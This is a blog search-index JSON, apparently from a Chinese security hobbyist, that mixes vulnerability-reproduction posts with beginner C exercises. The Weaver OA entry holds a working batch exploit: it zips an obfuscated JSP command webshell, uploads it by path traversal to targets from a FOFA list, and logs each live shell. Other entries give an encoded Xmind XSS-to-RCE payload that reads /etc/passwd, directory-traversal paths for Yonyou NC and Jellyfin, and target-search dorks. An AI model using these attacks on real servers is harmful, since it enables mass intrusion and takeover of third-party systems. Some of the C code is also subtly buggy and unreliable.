存在任意文件上传漏洞，攻击者通过漏洞可以上传webshell文件控制服务器 ","date":"2021-05-20","objectID":"/%E6%B3%9B%E5%BE%AEoa-weaver-common-ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:2","tags":["泛微OA","漏洞复现","文件上传","渗透测试"],"title":"泛微OA weaver.common.Ctrl 任意文件上传漏洞","uri":"/%E6%B3%9B%E5%BE%AEoa-weaver-common-ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Fofa app=\"泛微-协同办公OA\" ","date":"2021-05-20","objectID":"/%E6%B3%9B%E5%BE%AEoa-weaver-common-ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:3","tags":["泛微OA","漏洞复现","文件上传","渗透测试"],"title":"泛微OA weaver.common.Ctrl 任意文件上传漏洞","uri":"/%E6%B3%9B%E5%BE%AEoa-weaver-common-ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"复现 漏洞路径为： /weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp\u0026arg1=validateApp 查看发送的数据包： 使用POC成功上传文件： 贴上大佬的批量上传POC脚本(我改过的)： import zipfile import random import sys import requests def generate_random_str(randomlength=16): random_str = '' base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789' length = len(base_str) - 1 for i in range(randomlength): random_str += base_str[random.randint(0, length)] return random_str mm = generate_random_str(8) webshell_name1 = mm+'.jsp' webshell_name2 = '../../../'+webshell_name1 def file_zip(): shell = \"\"\"\u003c%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %\u003e \u003c%@ page import=\"sun.misc.BASE64Decoder\" %\u003e \u003c% if(request.getParameter(\"cmd\")!=null){ BASE64Decoder decoder = new BASE64Decoder(); Class rt = Class.forName(new String(decoder.decodeBuffer(\"amF2YS5sYW5nLlJ1bnRpbWU=\"))); Process e = (Process) rt.getMethod(new String(decoder.decodeBuffer(\"ZXhlYw==\")), String.class).invoke(rt.getMethod(new String(decoder.decodeBuffer(\"Z2V0UnVudGltZQ==\"))).invoke(null, new Object[]{}), request.getParameter(\"cmd\") ); java.io.InputStream in = e.getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\"\u003cpre\u003e\"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\"\u003c/pre\u003e\"); } %\u003e \"\"\" ## 替换shell内容 zf = zipfile.ZipFile(mm+'.zip', mode='w', compression=zipfile.ZIP_DEFLATED) zf.writestr(webshell_name2, shell) def GetShell(urllist): file_zip() print('上传文件中') urls = urllist + '/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp\u0026arg1=validateApp' file = [('file1', (mm+'.zip', open(mm + '.zip', 'rb'), 'application/zip'))] requests.post(url=urls,files=file,timeout=60, verify=False) GetShellurl = urllist+'/cloudstore/'+webshell_name1 GetShelllist = requests.get(url = GetShellurl) if GetShelllist.status_code == 200: print('利用成功webshell地址为:'+GetShellurl) with open(\"success_webshell.txt\", \"a+\") as f2: f2.write(GetShellurl + \"\\n\") else: print('未找到webshell利用失败') def main(): # # if (len(sys.argv) == 2): # # url = sys.argv[1] # GetShell(url) # else: # print(\"python3 poc.py http://xx.xx.xx.xx\") with open(\"fofa提取结果文件.txt\", \"r+\") as f: lines = f.readlines() for line in lines: try: GetShell(line.strip()) except Exception as e: pass if __name__ == '__main__': main() 参考大佬文章链接：https://mp.weixin.qq.com/s/ePYRFPfu-pvWMKSiffporA ","date":"2021-05-20","objectID":"/%E6%B3%9B%E5%BE%AEoa-weaver-common-ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:4","tags":["泛微OA","漏洞复现","文件上传","渗透测试"],"title":"泛微OA weaver.common.Ctrl 任意文件上传漏洞","uri":"/%E6%B3%9B%E5%BE%AEoa-weaver-common-ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["C语言"],"content":"61. 求两个数的最大公约数和最小公倍数 //1.求两个数的最大公约数和最小公倍数 int min_max(int x, int y) { //辗转相除法 int tmp; /* 余数不为0，继续相除，直到余数为0 */ while (x%y != 0) { tmp = y; //b在下一轮中作为除数，即是下一轮中的a，所以先闪到一边去 y = x%y; //a,b的余数作为下一轮中的b,由a%b来取得 x = tmp; //刚才tmp中存储了b的值，现在拿出来当做下一轮中的a使用 } return y; } void min_max_test() { int m,n, min; printf(\"使用辗转相除法求算\\n\"); printf(\"请输入两个整数，如（7 24）：\"); scanf(\"%d%d\", \u0026m, \u0026n); while (m \u003c= 0 || m \u003c= 0) { printf(\"输入有误，请重新输入：\\n\\t\"); scanf(\"%d%d\", \u0026m, \u0026n); } min = min_max(m, n); printf(\"用辗转相除法求得 最大公约数为:%d\\n\", min); printf(\"\\n\\t\\t 最小公倍数为:%d\\n\", m*n / min); } 62.在字符串种的所有数字字符前加一个$字符。 例如：输入ARB23CD45输A$1B$2$3CD$4$5 #include \u003cstring.h\u003es void add_daola(char *s) { char tmp[80]; int i, j; for (i = 0;s[i]; i++) //复制s数组到t数组中 { tmp[i] = s[i]; } tmp[i] = '\\0'; //遍历 for (i = 0, j=0; tmp[i]; i++) { //如果遇到数字，前面先把$加入s，再加入数字 if(tmp[i] \u003e='0' \u0026\u0026 tmp[i] \u003c= '9') { s[j++] = '$'; s[j++] = tmp[i]; } //如果不是数字，则正常加入 else s[j++] = tmp[i]; } s[j++] = '\\0'; } void add_daola_test() { char s[80]; printf(\"请输入字符串：\"); scanf(\"%s\", s); add_daola(s); //调用 printf(\"处理结果：\"); puts(s); } 63.一个整数，它加上100后是个完全平方数，再加上168又是一个完全平方数，请问该数是多少? #include \u003cmath.h\u003e void full_sqart() { long int i, x,y,z; for (i = 0; i \u003c 10000; i++) { x = sqrt((double)(i+100)); // x为加上100然后开方后的结果 y = sqrt((double)(i+168)); if(x*x == i+100 \u0026\u0026 y*y == i+168) //如果一个数的平方根的平方等于该数，...... { printf(\"%ld是完全平方数\\n\", i); } } } 64.质因数分解: 将一个正整数分解质因数。 如:输入90,打印出90=2*3*3*5. //???没太懂 void zzhiyunshu() { int i, n; printf(\"请输入正整数：\"); scanf(\"%d\", \u0026n); for (i=2; i \u003c= n; i++) { while (n != i) { if( n % i == 0) { printf(\"%d*\", i); n = n/i; // ??? } else break; } } printf(\"%d\\n\", n); } 65.自由落体求高度问题： 一球从 100米高度自由落下，每后次落地后反跳回原高度的一半再落下， 求它在第10次落地时，共经过多少米?第10次反弹多高? void drop_heigth() { float sn = 100, hn = sn/2; for (int i = 0; i \u003c=10; i++) { sn = sn + 2*hn; //sn走过的距离(第i次落地时公经过的米数) hn = hn /2; // 第n次反跳高度 } printf(\"在第10次落地时，共经过多少米: %f \\n\", sn); printf(\"第10次反弹多高：%f \\n\", hn); } 66.求亲密数 如果整数A的全部因子(包括1，不包括A本身)之和等于B;且整数B的全部因子(包括1,不句括B本身)之和等于A,则将整数A和B称为亲密数。求3000以内的全部亲密数。 // 对于这类多次将某些值存储到一个变量中时，一定要注意变量赋初值的位置。 void honey_num() { int a, b, n, i; for (a = 1; a \u003c 3000; a++) { for (b=0, i = 1; i \u003c a/2; i++) if(!(a%i)) b += i; //将a的因子累加和存到b中 for (n=0, i = 1; i \u003c b/2; i++) if(!(b%i)) n += i; //将b的因子累加和存到n中 //判断 if(a == n \u0026\u0026 a\u003cb) //使得每对亲密数只输出一次 printf(\"%d --- %d\", a,b); //如果n和a相等，则a和b是一对亲密数 } } 使用递归逆序输出 利用递归函数调用方式，将所输入的5个字符，以相反顺序打印出来。 // 方法1： void revsese_num_out(int n) { char ch; if(n \u003c=1) { ch = getchar(); putchar(ch); } else { ch = getchar(); revsese_num_out(n-1); putchar(ch); } } void main() { revsese_num_out(3); } //方法2： void reverse_str(char *s, int n) { int i; if((i=n/10) != 0) reverse_str(s+1, i); *s = n%10+'0'; } void main() { int num; char str[10]=\"\"; printf(\"input integer data：\"); scanf(\"%d\",\u0026num); reverse_str(str,num); printf(\"output string：\\n\"); puts(str); } 68.猜年龄问题 有5个人坐在一起，问第五个人多少岁?他说比第4个人大2岁。问第4个人岁数，他说比第3个人大2岁。问第三个人，又说比第2人大两岁。问第2个人，说比第一个人大两岁。最后问第一个人，他说是10岁。请问第五个人多大? int guess_age(int n) { if(n ==1) return 10; else return guess_age(n-1) + 2; } void main() { printf(\"第5个人年龄: %d \\n\", guess_age(5)); } 69.写一个递归程序求具有n个元素的整型数组R的和 int get_sum(int R[], int n) { if(n==1) return R[0]; else return (R[n-1] + get_sum(R, n-1)); } void get_sum_test() { int R[5] = {11,22,33,44,55}; printf(\"求和: %d\", get_sum(R, 5)); } 70.写一个递归程序求具有n个元素的整型数组R中最大值 int get_max(int R[], int n) { if(n==1) return R[0]; else { if(R[n-1] \u003e= get_max(R, n-1)) return R[n-1]; else return get_max(R, n-1); } } void get_max_test() { int R[5] = {11,22,33,44,55}; printf(\"最大值:%d \\n\", get_max(R, 5)); } 71.写一个递归程序求具有n个元素的整型数组R的平均值 int get_avg(int R[], int n) { if( n==1) return R[0]; else return(R[n-1] + get_avg(R,n-1)*(n-1))/n; //这里不太懂 } void get_avg_test() { int R[5] = {11,22,33,44,55}; printf(\"平均值:%d \\n\", get_avg(R, 5)); } 72.给一个不多于5位的正整数，要求: 一、 求它是几位数， 二、逆序打印出各位数字。 void process_5num() { int num, n=0; printf(\"输入一个不超过5位的正整数：\"); scanf(\"%d\", \u0026num); printf(\"逆序打印: \"); while (num) { n++; printf(\"%d\", num%10); num = num / 10; } printf(\"\\n位数: %d\", n); } // 4%10 = 4 73.编写一个递归程序输入一个非负整数，返回返回组成它的数字之和 例如，调Di","date":"2021-05-20","objectID":"/c%E8%AF%AD%E8%A8%80%E7%AE%80%E5%8D%95%E5%88%B7%E9%A2%982-%E6%9C%AA%E5%AE%8C/:0:0","tags":["编程刷题","C语言"],"title":"C语言简单刷题2(未完)","uri":"/c%E8%AF%AD%E8%A8%80%E7%AE%80%E5%8D%95%E5%88%B7%E9%A2%982-%E6%9C%AA%E5%AE%8C/"},{"categories":["编程"],"content":"递归求具有n个元素的整型数组R的平均值 今天做题的时候遇到这个不会的题，虽然题很简单单还是太菜了，记录下来，这还是问了一个小学妹之后才懂了，自卑ing… … int get_agv(int R[], int n) { if(n==1) return R[0]; else return (R[n-1] + get_agv(R, n-1)*(n-1))/n; // n-1 用来约分母(约前面一个数的分母)， 把分母写在横线的下面比较容易看出来 } void main() { int R[5] = {22,44,66,88,10}; printf(\"平均值: %d\\n\", get_agv(R, 5)); } 最后一句：return (R[n-1] + get_agv(R, n-1)*(n-1))/n;中的n-1是用来约分母的(约前面一个数的分母)，比如下面这样更直观一点 ","date":"2021-05-12","objectID":"/%E9%80%92%E5%BD%92%E6%B1%82%E5%85%B7%E6%9C%89n%E4%B8%AA%E5%85%83%E7%B4%A0%E7%9A%84%E6%95%B4%E5%9E%8B%E6%95%B0%E7%BB%84r%E7%9A%84%E5%B9%B3%E5%9D%87%E5%80%BC/:0:0","tags":["C语言题","笔记"],"title":"递归求具有n个元素的整型数组R的平均值","uri":"/%E9%80%92%E5%BD%92%E6%B1%82%E5%85%B7%E6%9C%89n%E4%B8%AA%E5%85%83%E7%B4%A0%E7%9A%84%E6%95%B4%E5%9E%8B%E6%95%B0%E7%BB%84r%E7%9A%84%E5%B9%B3%E5%9D%87%E5%80%BC/"},{"categories":["渗透测试"],"content":"漏洞描述 Xmind2020 存在XSS漏洞，攻击者可利用该漏洞进行命令执行。由于软件允许用户以文件形式或自定义标题标题的形式存储JS代码，攻击者可以发送带有恶意JS代码的文件。用户打开文件后，从而执行攻击者预先设定好的命令。 ","date":"2021-05-11","objectID":"/xmind2020%E5%AD%98%E5%9C%A8xss%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:0:1","tags":["漏洞复现","xmind2020","XSS"],"title":"xmind2020存在XSS漏洞可导致命令执行","uri":"/xmind2020%E5%AD%98%E5%9C%A8xss%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["渗透测试"],"content":"漏洞复现 测试环境：ubuntu18.04、xmind2020 1.打开xmind后，在思维导图模式下输入以下Payload： \u003cimg src=x onerror=writeln(String.fromCharCode(60,115,99,114,105,112,116,62,10,99,111,110,115,116,32,123,32,115,112,97,119,110,32,125,32,61,32,114,101,113,117,105,114,101,40,34,99,104,105,108,100,95,112,114,111,99,101,115,115,34,41,59,10,99,111,110,115,116,32,99,97,116,32,61,32,115,112,97,119,110,40,34,99,97,116,34,44,32,91,34,47,101,116,99,47,112,97,115,115,119,100,34,93,41,59,10,99,97,116,46,115,116,100,111,117,116,46,111,110,40,34,100,97,116,97,34,44,32,100,97,116,97,32,61,62,32,123,10,32,32,32,32,97,108,101,114,116,40,96,115,116,100,111,117,116,58,32,36,123,100,97,116,97,125,96,41,59,10,125,41,59,60,47,115,99,114,105,112,116,62))\u003e 解码后数据即为： //Decode Payload \u003cscript\u003e const { spawn } = require(\"child_process\"); const cat = spawn(\"cat\", [\"/etc/passwd\"]); cat.stdout.on(\"data\", data =\u003e { alert(`stdout: ${data}`); });\u003c/script\u003e 补充知识： // 1.str转unicode序列 var c = \"\u003cscript\u003e\\nvar Process = process.binding('process_wrap').Process;\\nvar proc = new Process();\\nproc.onexit = function(a,b) {};\\nvar env = process.env;\\nvar env_ = [];\\nfor (var key in env) env_.push(key+'='+env[key]);\\nproc.spawn({file:'c:\\\\windows\\\\system32\\\\calc.exe',cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});\\n\u003c/script\u003e\" var codeArr = []; for(var i=0;i\u003cc.length;i++){ codeArr.push(c.charCodeAt(i)); } console.log(codeArr); // 2.unicode序列还原为str var n = String.fromCharCode(60, 115, 99, 114, 105, 112, 116, 62, 10, 118, 97, 114, 32, 80, 114, 111, 99, 101, 115, 115, 32, 61, 32, 112, 114, 111, 99, 101, 115, 115, 46, 98, 105, 110, 100, 105, 110, 103, 40, 39, 112, 114, 111, 99, 101, 115, 115, 95, 119, 114, 97, 112, 39, 41, 46, 80, 114, 111, 99, 101, 115, 115, 59, 10, 118, 97, 114, 32, 112, 114, 111, 99, 32, 61, 32, 110, 101, 119, 32, 80, 114, 111, 99, 101, 115, 115, 40, 41, 59, 10, 112, 114, 111, 99, 46, 111, 110, 101, 120, 105, 116, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 97, 44, 98, 41, 32, 123, 125, 59, 10, 118, 97, 114, 32, 101, 110, 118, 32, 61, 32, 112, 114, 111, 99, 101, 115, 115, 46, 101, 110, 118, 59, 10, 118, 97, 114, 32, 101, 110, 118, 95, 32, 61, 32, 91, 93, 59, 10, 102, 111, 114, 32, 40, 118, 97, 114, 32, 107, 101, 121, 32, 105, 110, 32, 101, 110, 118, 41, 32, 101, 110, 118, 95, 46, 112, 117, 115, 104, 40, 107, 101, 121, 43, 39, 61, 39, 43, 101, 110, 118, 91, 107, 101, 121, 93, 41, 59, 10, 112, 114, 111, 99, 46, 115, 112, 97, 119, 110, 40, 123, 102, 105, 108, 101, 58, 39, 99, 58, 92, 119, 105, 110, 100, 111, 119, 115, 92, 115, 121, 115, 116, 101, 109, 51, 50, 92, 99, 97, 108, 99, 46, 101, 120, 101, 39, 44, 99, 119, 100, 58, 110, 117, 108, 108, 44, 119, 105, 110, 100, 111, 119, 115, 86, 101, 114, 98, 97, 116, 105, 109, 65, 114, 103, 117, 109, 101, 110, 116, 115, 58, 102, 97, 108, 115, 101, 44, 100, 101, 116, 97, 99, 104, 101, 100, 58, 102, 97, 108, 115, 101, 44, 101, 110, 118, 80, 97, 105, 114, 115, 58, 101, 110, 118, 95, 44, 115, 116, 100, 105, 111, 58, 91, 123, 116, 121, 112, 101, 58, 39, 105, 103, 110, 111, 114, 101, 39, 125, 44, 123, 116, 121, 112, 101, 58, 39, 105, 103, 110, 111, 114, 101, 39, 125, 44, 123, 116, 121, 112, 101, 58, 39, 105, 103, 110, 111, 114, 101, 39, 125, 93, 125, 41, 59, 10, 60, 47, 115, 99, 114, 105, 112, 116, 62); console.log(n); 2.点击大纲。在大纲模式下，选中payload，按下Ctrl+C快捷键触发该Payload，执行calc命令。 ","date":"2021-05-11","objectID":"/xmind2020%E5%AD%98%E5%9C%A8xss%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:0:2","tags":["漏洞复现","xmind2020","XSS"],"title":"xmind2020存在XSS漏洞可导致命令执行","uri":"/xmind2020%E5%AD%98%E5%9C%A8xss%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["渗透测试"],"content":"修复建议 该漏洞在大纲模式下触发，Xmind 2020的使用者，谨慎打开Xmind的大纲模式。 ","date":"2021-05-11","objectID":"/xmind2020%E5%AD%98%E5%9C%A8xss%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:0:3","tags":["漏洞复现","xmind2020","XSS"],"title":"xmind2020存在XSS漏洞可导致命令执行","uri":"/xmind2020%E5%AD%98%E5%9C%A8xss%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["渗透测试"],"content":"参考 Xmind 2020 - XSS to RCE - Multiple webapps Exploit (exploit-db.com) 漏洞情报 | Xmind 2020 XSS漏洞导致命令执行 (qq.com) ","date":"2021-05-11","objectID":"/xmind2020%E5%AD%98%E5%9C%A8xss%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:0:4","tags":["漏洞复现","xmind2020","XSS"],"title":"xmind2020存在XSS漏洞可导致命令执行","uri":"/xmind2020%E5%AD%98%E5%9C%A8xss%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["C语言"],"content":"1.编写一个程序求三个整数数的最大值 /* 1.编写一个程序求三个整数数的最大值 */ #include \u003cstdio.h\u003e int main() { int i,j,k, max=0; printf(\"请输入三个整数：\"); scanf(\"%d %d %d\", \u0026i, \u0026j, \u0026k); max = (i\u003ej?i:j)\u003ek?(i\u003ej?i:j):k; printf(\"最大值为：%d\", max); //getchar(); } 2.输入10个数,并输出最大的那一个数 /* 2.输入10个数,并输出最大的那一个数 */ void ten_max() { int arr[10], max=0; printf(\"请输入10个整数：\\n\"); for(int i=0; i\u003c=9; i++) { scanf(\"%d\", \u0026arr[i]); } //处理 for(int i=0; i\u003c=9; i++) { if(arr[i] \u003e max) { max = arr[i]; } } printf(\"最大值为：%d\", max); } int main() { //three_max(); ten_max(); } 3.判断2000-2500年中的闰年,并输出 3.判断2000-2500年中的闰年,并输出 */ void get_leap_year() { for(int i=2000; i\u003c=2500; i++) { if(i %400 ==0 || (i % 100 != 0 \u0026\u0026 i % 4 == 0)) { printf(\"%d 是闰年\\n\", i); } } } int main() { //three_max(); //ten_max(); get_leap_year(); } 4.编写一个程序求1+2+3+…+…+100的值 void sum_100() { int sum=0; for(int i=1; i\u003c=100; i++) { sum += i; } printf(\"%d\", sum); } int main() { //three_max(); //ten_max(); //get_leap_year(); sum_100(); } 5.编写一个程序求(1)-(1/2)+(1/3)……+(1/99)-(1/100)的值 /* 5.编写一个程序求(1)-(1/2)+(1/3)……+(1/99)-(1/100)的值 */ void sum_100_sub() { float sign=1,sum=0, deno, tmp; for(deno=1; deno\u003c=100; deno++) { tmp = sign*(1/deno); //分数形式 sum = sum + tmp; //加和，全面存储 sign = (-1)*sign; //换号 } printf(\"%f \\n\", sum); } int main() { //three_max(); //ten_max(); //get_leap_year(); //sum_100(); sum_100_sub(); } 6.判断一个数能否同时被3和5整除 /* 6.判断一个数能否同时被3和5整除 */ void division_3_5() { int num; printf(\"输入一个整数：\"); scanf(\"%d\", \u0026num); if (num % 3 == 0 \u0026\u0026 num % 5 == 0) { printf(\"能同时被5和3整除\"); } else { printf(\"不能\"); } } int main() { //three_max(); //ten_max(); //get_leap_year(); //sum_100(); //sum_100_sub(); division_3_5(); } 7.将具有n个元素的数组a中数按照从小到大排序并从大到小输出 7.将具有n个元素的数组a中数按照从小到大排序并从大到小输出 */ void sort_arr() { int sum=0, num, a[100], n, tmp; printf(\"输入n:\"); scanf(\"%d\", \u0026n); for(int i=0; i\u003c n; i++) { scanf(\"%d\", \u0026a[i]); } printf(\"元素为; \"); for(int i=0; i\u003c n; i++) { printf(\"%d\", a[i]); } //排序 for(int i=0; i\u003cn; i++) { for(int j=i+1; i\u003cn; j++) // a[j]代表a[i+1] { if(a[i] \u003e a[j]) { tmp = a[i]; tmp = a[j]; a[j] = a[i]; //交换a[i]和a[i+1] } } // } //输出 printf(\"从小到大元素为; \"); for(int i=n-1; i \u003e= 0; i--) { printf(\"%d\", a[i]); } } 8.编写一个程序将大写字母转换成小写字母 /* 8.编写一个程序将大写字母转换成小写字母 */ void big_to_small() { char c1, c2; scanf(\"%c\", \u0026c1); c2 = c1 + 'a'-'A'; printf(\"%c \\n\", c2); } int main() { big_to_small(); } 9.编写一个程序将小写字母转换成大写字母 /* 9.编写一个程序将小写字母转换成大写字母 */ void small_to_big() { char c1, c2; scanf(\"%c\", \u0026c1); c2 = c1 + 'A'-'a'; printf(\"%c \\n\", c2); } int main() { small_to_big(); } 10.输入字符,最终按小写输出 /* 10.输入字符,最终按小写输出 */ void all_to_small() { char ch; printf(\"输入字符：\"); scanf(\"%c\", \u0026ch); ch = (ch \u003e='A' \u0026\u0026 ch \u003c= 'Z')?(ch + 'a'-'A'):ch; printf(\"输出: %c\\n\", ch); } int main() { all_to_small(); } 11.给出三角形边长a、b、c计算出面积 void tri_11() { double a=2,b=2,c=3,p,s; if(a+b\u003ec \u0026\u0026 a+c\u003eb \u0026\u0026 b+c\u003ea) //判断是否可以构成三角形。 { p=(a+b+c)/2;//计算半周长 s=sqrt(p*(p-a)*(p-b)*(p-c));//套用海伦公式，计算面积 printf(\"面积为%lf\\n\", s);//输出结果 } else printf(\"无法构成三角形\\n\"); } 12.给出三角形三个点坐标计算出面积 void tri_12() { Point p1, p2, p3; double a,b,c, area; p1.x = 1; p1.y = 2; p2.x = 1; p2.y = 3; p3.x = 2; p3.y = 2; a = sqrt((p1.x-p2.x)*(p1.x-p2.x) + (p1.y-p2.y)*(p1.y-p2.y)); b = sqrt((p2.x-p3.x)*(p2.x-p3.x) + (p2.y-p3.y)*(p2.y-p3.y)); c = sqrt((p1.x-p3.x)*(p1.x-p3.x) + (p1.y-p3.y)*(p1.y-p3.y)); area = (a+b+c)/2; printf(\"%lf\", area); } 13.请编程序将”China”译成密码 密码规律是:用原来的字母后面第4个字母代替原来的字母。例如:字母“A”后面第4个字母是“E”，用“E”代替”A”。因此，”China”应译为”Glmre”。请编一程序，用赋初值的方法使c1,c2,c3, c4,c5这5个变量的值分别为’C’，‘h’,’，‘n’, ‘a’，经过运算，使c1, c2, c3, c4, c5分别为’G’，‘I,‘m’,‘r’，‘e’。分别用putchar函数和 printf 函数输出这个5个字符 void china_pass() { char c1='C',c2='h',c3='i',c4='n',c5='a'; c1+=4; c2+=4; c3+=4; c4+=4; c5+=4; printf(\"%c%c%c%c%c\",c1,c2,c3,c4,c5); } 14.给出一个百分制成绩，要求输出成绩等级A,B,C,D,E。90分以上为A，8090分为B,7079分为C,60~69分为D,60分以下为E。 //14.给出一个百分制成绩，要求输出成绩等级A,B,C,D,E。90分以上为A，80~90分为B,70~79分为C,60~69分为D,60分以下为E。 void grade_bank() { int grade; printf(\"请输入成绩(0-100): \"); scanf(\"%d\", \u0026grade); switch (grade/10) { case 10: case 9: printf(\"A\"); break; case 8: printf(\"B\"); break; case 7: printf(\"C\"); break; case 6: printf(\"D\"); break; default: printf(","date":"2021-05-07","objectID":"/c%E8%AF%AD%E8%A8%80%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95-%E5%85%A5%E9%97%A8%E7%89%88/:0:0","tags":["C语言","编程刷题"],"title":"C语言做题记录(入门版)","uri":"/c%E8%AF%AD%E8%A8%80%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95-%E5%85%A5%E9%97%A8%E7%89%88/"},{"categories":["渗透测试"],"content":"fofa语句： title=\"流媒体管理服务器\" 登录： ","date":"2021-04-29","objectID":"/%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AD%98%E5%9C%A8%E5%BC%B1%E4%BB%A4%E6%BC%8F%E6%B4%9E/:0:0","tags":["漏洞复现","弱口令"],"title":"流媒体管理服务器存在弱⼝令漏洞","uri":"/%E6%B5%81%E5%AA%92%E4%BD%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AD%98%E5%9C%A8%E5%BC%B1%E4%BB%A4%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"漏洞描述 ⽤友ERP-NC 存在⽬录遍历漏洞，攻击者可以通过⽬录遍历获取敏感⽂件信息 ","date":"2021-04-29","objectID":"/%E5%8F%8Berp-nc-%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:0:1","tags":["漏洞复现","用友ERP-NC"],"title":"⽤友ERP-NC ⽬录遍历漏洞","uri":"/%E5%8F%8Berp-nc-%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"fofa语法 app=\"⽤友-UFIDA-NC\" ","date":"2021-04-29","objectID":"/%E5%8F%8Berp-nc-%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:0:2","tags":["漏洞复现","用友ERP-NC"],"title":"⽤友ERP-NC ⽬录遍历漏洞","uri":"/%E5%8F%8Berp-nc-%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"复现 POC: /NCFindWeb?service=IPreAlertConfigService\u0026filename= 查看文件（这里以admin.jsp为例）： ","date":"2021-04-29","objectID":"/%E5%8F%8Berp-nc-%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:0:3","tags":["漏洞复现","用友ERP-NC"],"title":"⽤友ERP-NC ⽬录遍历漏洞","uri":"/%E5%8F%8Berp-nc-%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"影响版本： Jellyfin\u003c10.7.1 ","date":"2021-04-13","objectID":"/jellyfin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-cve-2021-21402/:0:1","tags":["漏洞复现","Jellyfin"],"title":"Jellyfin任意文件读取漏洞复现(CVE-2021-21402)","uri":"/jellyfin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-cve-2021-21402/"},{"categories":["渗透测试"],"content":"复现 ","date":"2021-04-13","objectID":"/jellyfin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-cve-2021-21402/:1:0","tags":["漏洞复现","Jellyfin"],"title":"Jellyfin任意文件读取漏洞复现(CVE-2021-21402)","uri":"/jellyfin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-cve-2021-21402/"},{"categories":["渗透测试"],"content":"fofa语法 title=\"Jellyfin\" ","date":"2021-04-13","objectID":"/jellyfin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-cve-2021-21402/:1:1","tags":["漏洞复现","Jellyfin"],"title":"Jellyfin任意文件读取漏洞复现(CVE-2021-21402)","uri":"/jellyfin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-cve-2021-21402/"},{"categories":["渗透测试"],"content":"POC # poc_1 GET /Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/ Host:xxx.xxx.xxx.xxx Content-Type: application/octet-stream # poc_2 GET 